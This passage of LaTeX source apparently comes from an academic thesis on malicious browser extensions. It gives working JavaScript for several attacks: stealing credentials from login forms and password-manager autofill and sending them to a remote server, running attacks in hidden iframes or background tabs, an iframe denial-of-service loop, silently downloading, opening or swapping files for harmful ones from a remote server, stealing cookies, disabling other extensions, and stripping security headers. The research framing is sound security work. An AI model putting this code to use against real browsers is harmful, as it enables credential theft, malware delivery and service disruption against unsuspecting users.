		\label{tab:summaryRemoteCommunication}
	\end{table}

	\begin{table}[h]
		\centering
		\begin{tabular}{|l|l|} \hline
			\textbf{Technique} & \textbf{Needed Privileges} \\ \hline
			Script element in background & Modified CSP with remote server URL \\
			Script element in content script & Content script \\
			XMLHttpRequest, execute in background & \texttt{http://*/*, https://*/*}, modified CSP with \texttt{unsafe\_eval} \\
			XMLHttpRequest, execute in content script & \texttt{http://*/*, https://*/*}  \\
			Mutual extension communication & Content script, second extension \\ 
			\hline
		\end{tabular}
		\caption{Summary of techniques to load and execute a remote script with needed permissions.}
		\label{tab:summaryFetchScript}
	\end{table}
	
	


\clearpage
\section{Execution}
\label{sec:execution}
	

\subsection{Steal Information}

	% refer to implementations in user identification section, have already shown that we can steal sensitive information

\subsubsection{Steal Credentials}
	%TODO intro
	
	To steal the credentials from a login form, we use two content scripts which we inject in every web page. This attack does not need additional permissions. The content script shown in \autoref{code:stealCredentialsOnSubmit} steals the credentials if the user submits the login form and The other one shown in \autoref{code:stealCredentialsFromPasswordManager} steals the credentials if the browser's password manager has filled them in the login form. To send the stolen credentials to our remote server, we use the \texttt{send} method shown in \autoref{code:sendDataWithIframe} because it does not need additional permissions, too. 
	
	In \autoref{code:stealCredentialsOnSubmit} we begin with retrieving an input element of type password (line 1). If we have found one (line 2), we retrieve the form which contains the password element (line 3). Finally, we add an event listener to the form which is triggered if the user submits the form and subsequently sends the form with all its values to our remote server (lines 4-6). 
	
	\autoref{code:stealCredentialsFromPasswordManager} is a similar implementation to \autoref{code:stealCredentialsOnSubmit}. Again, we begin with getting an input element of type password and the corresponding form element (lines 1-3). Then we delay the execution about 500 milliseconds to give the password manager the time to fill in the form's credentials (line 4). Finally, if the password field is not empty, we will send the form to our remote server (lines 5-7).
	
	\begin{code}
		\begin{lstlisting}	
var passwordElement = $('input[type="password"');
if(passwordElement.length > 0) {
	var form = passwordElement.closest('form');
	form.submit(function(event) {
		send(form);
	});
}
\end{lstlisting}
		\caption{Content Script that steals credentials from a login form if the user submits the form.}
		\label{code:stealCredentialsOnSubmit}
	\end{code}
	
	\begin{code}
		\begin{lstlisting}
var passwordElement = $('input[type="password"');
if(passwordElement.length > 0) {
	var form = passwordElement.closest('form');
	setTimeout(function() {
		if(passwordElement.val() != '') {
			send(form);
		}
	}, 500);
}
\end{lstlisting}
		\caption{Content Script that steals credentials from a login form if the browser's password manager has filled in the credentials.}
		\label{code:stealCredentialsFromPasswordManager}
	\end{code}
	
	
	
\subsection{Execute Attack In Background}

	We implemented several approaches that open predefined web pages to execute particular attacks such as to steal probably stored credentials from the browser's password manager. Different strategies to hide the loading of a new web page were previously discussed by Bauer et al. \cite{extensions:cns14}. We implemented three described approaches:
	
	\begin{enumerate}
		\item Load the targeted web page in an invisible iframe inside any web page.
		\item Load the targeted web page in an inactive tab and switch back to the original web page after the attack has finished.
		\item Open a new tab in an inactive browser window and load the targeted web page in this tab. Close the tab after the attack has finished.
	\end{enumerate} 
	
	The first approach is the least reliable one. There exists several methods to enforce that a web page is not displayed in an iframe. The standardized approach is to use the \texttt{X-Frame-Option} HTTP header which is compatible with all current browsers \cite{xFrameOptionsSpezification, xFrameOptionsCompability}. This transfers the responsibility to enforce that the web page is not loaded into an iframe to the browser. Other approaches use JavaScript to deny the web page's functionality if it is loaded in an iframe or to move the web page from the iframe to the main frame.
		
	To open a particular web page in an iframe, we use a content script with the \texttt{any\_frame} option which enables that the content script is executed in iframes, too. Our implementation is shown in \autoref{code:openWebPageInIframe}. It checks whether or not it is currently active in the main frame (line 1). If it is active in an iframe, we execute another attack in the scope of the loaded web page. If the content script is currently active in the main frame, we send a message to the extension's background to retrieve a URL (line 2). This is necessary because the content script itself can not store data - in our case a list of URLs - between different instances of itself. Then, we create a new iframe (line 3), turn it invisible for the user by setting its display property (line 4), set it's source attribute to the given URL which subsequently loads the targeted web page (line 5), and finally add it to the web page's DOM (line 6). 
	
	\begin{code}
		\begin{lstlisting}
if(window.self === window.top) {
	chrome.runtime.sendMessage({get: 'url'}, function(response) {
		var iframe = document.createElement('iframe');
		iframe.setAttribute('style', 'display: none;');
		iframe.setAttribute('src', response.url);
		document.body.appendChild(iframe);
	});
}
\end{lstlisting}
		\caption{Content script to open a particular web page in an iframe.}
		\label{code:openWebPageInIframe}
	\end{code}
	
	The second and third approach work very similar. Both use the browser's tab system to open a particular web page. Therefore, the extension needs the \texttt{http://*/*} and \texttt{https://*/*} host permissions and for the second approach additionally the \texttt{tabs} permission. 
	
	The implementation for the second approach, open the targeted web page in an inactive tab, is shown in \autoref{code:openPageInInactiveTab}. First, we query for an inactive tab (line 2) and store its URL (lines 1\&3). To access the URL of the web page that is currently displayed in the tab, we need the \texttt{tabs} permission. Then, we update the first found tab and load the targeted web page (line 4). After the tab has finished loading, we inject a content script in the tab which executes a particular attack (lines 5-7). Additionally, the content script will send a message to indicate that is has finished executing the attack. We await this message and update the tab from which the message originates with the stored URL to load the original web page (lines 10-12).
		
	\begin{code}
		\begin{lstlisting}
var storedURL;
chrome.tabs.query({ active: false }, function(tabs) {	
	storedURL = tabs[0].url;
	chrome.tabs.update(tabs[0].id, {url: TARGET_URL}, function(tab) {
		waitUntilTabHasFinishedLoading(function() {
			chrome.tabs.executeScript(tab.id, {file: 'content.js'});	
		});
	});
});
chrome.runtime.onMessage.addListener(function(message, sender) {
	chrome.tabs.update(sender.tab.id, {url: storedURL});
});
\end{lstlisting}
		\caption{Extension code to open a particular web page in an inactive tab to steal probably stored credentials.}
		\label{code:openPageInInactiveTab}
	\end{code}
	
	Our implementation for the third technique, open the targeted web page in a new tab in a background window, is shown in \autoref{code:openPageInNewBackgroundTab}. Instead of querying for an inactive tab like before, we query for a tab in a window which is not the currently active window (line 1). Next, we create a new tab in the same window as the queried tab and load the targeted web page (line 2). We wait until the tab has finished loading and then inject a content script with the implementation of a particular attack (lines 3-5). Again, we await the message that the content script has finished and consequently remove the before created tab (line 8-10).

	\begin{code}
		\begin{lstlisting}
chrome.tabs.query({ currentWindow: false }, function(tabs) {	
	chrome.tabs.create({ url: TARGET_URL, windowId: tabs[0].windowId },	function(tab) {
		waitUntilTabHasFinishedLoading(function() {
			chrome.tabs.executeScript(tab.id, { file: 'content.js' });	
		});
	});
});
chrome.runtime.onMessage.addListener(function(message, sender) {
	chrome.tabs.remove(sender.tab.id);
});
\end{lstlisting}
		\caption{Extension code to open a new tab in a background window an load a particular web page to steal probably stored credentials.}
		\label{code:openPageInNewBackgroundTab}
	\end{code}
			
	We tested our implementations in Chrome, Opera, and Firefox with our attack implementation to steal probably stored crendentials from the browser's password manager which we have shown in \autoref{code:stealCredentialsFromPasswordManager}. To our surprise, the attack was only successful in Firefox. The reason that the attack does not work in Chrome and Opera is that JavaScript has no access to the value of a password input field before any user interaction with the web page occurred. What first seems like a bug is an intended security feature to prevent exactly this kind of attack \cite{chromiumBlogPasswordInput}.


\subsection{Denial Of Service}

	An extension can execute unrestricted web requests from within a content script using an iframe element. We use this to implement a Denial of Service attack which we show in \autoref{code:DoSWithIframe}. First, we create a new iframe element (line 1), set its CSS property to make it invisible for the user (line 2), and append it to the web page's DOM (line 3). Then, we set the URL for the iframe to fire a HTTP request to the targeted server and add a random number as parameter to prevent that the browser fetches the targeted web page from its cache (line 5). We repeat this procedure at a fixed interval of 50 milliseconds to give the browser time to execute the request (line 4-6).

	\begin{code}
		\begin{lstlisting}
var iframe = document.createElement('iframe');
iframe.setAttribute('style', 'display:none;');
document.body.appendChild(iframe);
var interval = setInterval(function() {	
	iframe.setAttribute('src', TARGET_URL + '?' + Math.random());
}, 50);
\end{lstlisting}
		\caption{Content Script which executes a DoS attack by calling a URL multiple times with an iframe.}
		\label{code:DoSWithIframe}
	\end{code}





\subsection{Download Files}

	Using the \textit{download} module, an extension is able to monitor and cancel the user's downloads or to initiate a download itself. We implemented three attacks using this module. The purpose of these attacks is to get access to the user's machine which we can not achieve using only an extension. Therefore, we download additional, harmful files and execute them on the user's operating system. The first attack downloads a file without the user noticing and opens it itself. The second and third await a download initiated by the user and exchange the downloaded file. In this case, the user will execute the file for us because he trusts a file that he has downloaded himself.
	
	We implemented a component, that executes the first described attack namely downloading a file and opening it. For that purpose, the extension needs the \texttt{downloads} permission and additionally the \texttt{downloads.open} permission to open the downloaded file and the \texttt{downloads.shelf} permission to hide the download from the user. The \texttt{downloads.shelf} permission enables an extension to show or remove the shelf at the bottom of the browser that shows active downloads. 
	
	To open a downloaded file, the user has to interact with the extension and deliver some kind of input such as a mouse click. If no user input is given, the browser blocks the opening of a file. In our implementation, we use a content script that adds an on click event to each element of the current web page. If the user clicks any element, we send a message to our background script which also transfers the desired user input and use it to open the file.

	We show our implementation of the attacks's background script in \autoref{code:downloadAndOpenFile}. We start by disabling the download status bar of the browser so that the user does not see the download (line 2). Then, we initiate the download (line 3), wait until it has finished (line 4), and store its browser-internal id (line 5). We await a message from our content script and use the transmitted mouse click to open the downloaded file (lines 8-10). Finally, we delete our file from the browser's list of downloads and re-enable the download status bar to prevent that the user notices our attack (lines 11-12).
	
	\begin{code}
		\begin{lstlisting}
var storedDownloadId = null;
chrome.downloads.setShelfEnabled(false);
chrome.downloads.download({	url: REMOTE_SERVER_URL,	method: 'GET' }, function(downloadId) {
	waitUntilDownloadHasFinished(function() {
		storedDownloadId = downloadId;
	});
});		
chrome.runtime.onMessage.addListener(function() {
	if(storedDownloadId != null) {
		chrome.downloads.open(downloadItem.id);
		chrome.downloads.erase({id: downloadItem.id});
		chrome.downloads.setShelfEnabled(true);
	}
});
\end{lstlisting}
		\caption{Extension code to download and open a file without the user noticing.}
		\label{code:downloadAndOpenFile}
	\end{code}
	
	We implemented another background script that cancels a download which the user has initiated and then initiates a download itself. The aim of this attack is to exchange the file that user wants to download with a harmful one without him noticing. If it was successful, the user will execute the harmful file believing it is his desired file. Therefore, our implementation transmits the file's name and mime type with the request to download the harmful file. The server has to provide a file with the transmitted name and mime type to persuade the user.
	
	Our implementation is shown in \autoref{code:exchangeDownloadFile}. First, we create an event listener that is triggered if the user initiates a new download (line 1). We only target files with a particular mime type and therefore check if the downloading file's mime type matches (line 2). If this is true, we cancel the user's download (line 3), remove the entry from the browser's downloads list and the download status bar (line 4), and initiate the download of a file from our remote server (line 5). We send the name and the mime type of the file that the user wants to download along the request (line 6). This allows us to set the mime type and the filename correctly at our remote server.
	
	\begin{code}
		\begin{lstlisting}
chrome.downloads.onCreated.addListener(function (downloadItem) {
	if(downloadItem.mime === TARGETED_MIME_TYPE) {
		chrome.downloads.cancel(downloadItem.id);
		chrome.downloads.erase({ id: downloadItem.id });
		chrome.downloads.download({
			url: REMOTE_SERVER_URL + '?filename=' downloadItem.filename + '&mime_type=' + downloadItem.mime,
			method: 'GET',
		});
	}
});
\end{lstlisting}	
		\caption{Extension code to silently exchange a file that the user currently downloads.}	
		\label{code:exchangeDownloadFile}
	\end{code}
	
	Similar to our attack implementation at \autoref{code:exchangeDownloadFile}, we listen for the user initiating a new download, check for a particular mime type of the downloading file, and wait until the download has finished (lines 1-3). To generate a fake file at our remote server, we extract the name of the downloaded file from its full path on the user operating system (line 4). We remove the downloaded file (lines 5-7) and download our fake file (line 8-10). Again, we forward the name and mime type of the downloaded file to our remote server (line 9).
	
	\begin{code}
		\begin{lstlisting}
chrome.downloads.onCreated.addListener(function (downloadItem) {
	if(downloadItem.mime === TARGETED_MIME_TYPE) {
		waitUntilDownloadHasFinished(function() {
			var filename = downloadItem.filename.split('\x5c').pop();			
			chrome.downloads.removeFile(downloadItem.id, function() {
				chrome.downloads.erase({ id: downloadItem.id });
			});
			chrome.downloads.download({
				url: REMOTE_SERVER_URL + '?filename=' downloadItem.filename + '&mime_type=' + downloadItem.mime,
				method: 'GET',
			});	
		});
	}
});
\end{lstlisting}
		\caption{Extension code to silently exchange a file after the user has downloaded it.}
		\label{code:exchangeDownloadedFile}
	\end{code}



\subsection{Steal Cookies}

	\begin{code}
		\begin{lstlisting}
chrome.cookies.getAll({ url: TARGETED_URL }, function(cookies) {
	send(cookies);
});
\end{lstlisting}
		\caption{Extension code to steal cookies from any website.}
	\end{code}
	
	\begin{code}
		\begin{lstlisting}
send(document.cookie.split(';'));
\end{lstlisting}
		\caption{Content script to steal cookies from the current web page.}
	\end{code}



\subsection{Hamper Extension Management}

	We query for all currently installed extensions (line 1), iterate over the returned list (line 2), check if the extension's name equals our targeted extension (line 3), and finally disable the targeted extension (line 4). 

	\begin{code}
		\begin{lstlisting}
chrome.management.getAll(function(infos) {
	infos.forEach(function(info) {
		if(info.name === TARGET_EXTENSION_NAME) {
			chrome.management.setEnabled(info.id, false);
		}
	});
});
\end{lstlisting}
		\caption{Extension code to silently disable another extension.}
	\end{code}





\subsection{Web Requests}

	An extension with access to the \texttt{webRequest} module is able to modify and remove security relevant headers from a HTTP response. 
	To execute the first approach, our implementation removes the \texttt{X-Frame-Option} from any incoming web request to be able to load particular web pages into an iframe and steal probably stored credentials. For that purpose, it needs the permissions \texttt{"webRequest"}, \texttt{"webRequestBlocking"}, \texttt{"https://*/*"}, and \texttt{"http://*/*"}. 

	We begin by adding an event listener which is triggered if the browser receives the headers of a web request's response (line 1). Additionally, we explicit state that our listener is triggered on any HTTP or HTTPS request, that it is executed in a blocking manner which means the browser waits with the request's processing until our listener finishes, and that our listener has access to the response's headers (line 9). If the listener is triggered, we iterate over all headers (line 2) and compare the header's names. If it equals our targeted header's name, we remove the header from the list (lines 3-5). Finally we return the modified headers list and consequently continue the web request's processing. 

	\begin{code}
		\begin{lstlisting}
chrome.webRequest.onHeadersReceived.addListener(function(details) { 
	details.responseHeaders.forEach(function(header, index){
		if(header.name.toLowerCase() === TARGETED_HEADER_NAME){
			details.responseHeaders.splice(index,1);
		}
	});
	return({responseHeaders: details.responseHeaders});
},
{urls: ['https://*/*', 'http://*/*']}, ['blocking', 'responseHeaders']);
\end{lstlisting}
		\caption{Extension code to remove a probably security relevant header from any incoming web request.}
		\label{code:removeHTTPResponseHeader}
	\end{code} 

	Initially, we register a listener that is triggered when the browser initiates a web request (line 1). Like before, the listener is triggered on any HTTP or HTTPS request, the request's processing is blocked while the listener is active, and the listener has access to the request's body (line 8). Because a request does not mandatory have a body with values, we check if the currently processing request has one (line 2). Then, we check if our targeted form data is present (line 3) and exchange its value with a manipulated one (line 4). 
	
	\begin{code}
		\begin{lstlisting}
chrome.webRequest.onBeforeRequest.addListener(function(details){
	if(details.requestBody && details.requestBody.formData) {
		if(details.requestBody.formData[TARGETED_FORM_KEY]) {
			details.requestBody.formData[TARGETED_FORM_KEY] = MANIPULATED_FORM_VALUE;
		}
	}
},
{urls: ['https://*/*', 'http://*/*']}, ['blocking', 'requestBody']);
\end{lstlisting}
		\caption{Extension code to manipulate an outgoing web requests that contains a form.}
		\label{code:manipulateWebRequestForm}
	\end{code}
	
	\begin{table}
		\begin{tabular}{|l|l|} \hline 
			\textbf{Attack} & \textbf{Needed Permissions} \\ \hline
			Steal sensitive user data & Content script \\
			Steal form data & Content script \\
			Steal credentials & Content script \\
			\hline
			Execute concealed attack in iframe & Content script \\
			Execute concealed attack in inactive tab & \texttt{http://*/*, https://*/*, tabs} \\
			Execute concealed attack in background window & \texttt{http://*/*, https://*/*} \\
			\hline
			Denial of Service & Content script \\
			\hline
			Download and open file & \texttt{downloads, downloads.open, downloads.shelf} \\
			Exchange a downloaded file & \texttt{downloads} \\
			Exchange a currently downloading file & \texttt{downloads} \\
			\hline
			Disable another extension & \texttt{management} \\
			\hline
			Remove Security Relevant HTTP Header & \texttt{http://*/*, https://*/*, webRequest, webRequestBlocking} \\
			Manipulate outgoing web request & \texttt{http://*/*, https://*/*, webRequest, webRequestBlocking} \\
			\hline
		\end{tabular}
		\caption{Summary of implemented attacks with needed permissions.}
	\end{table}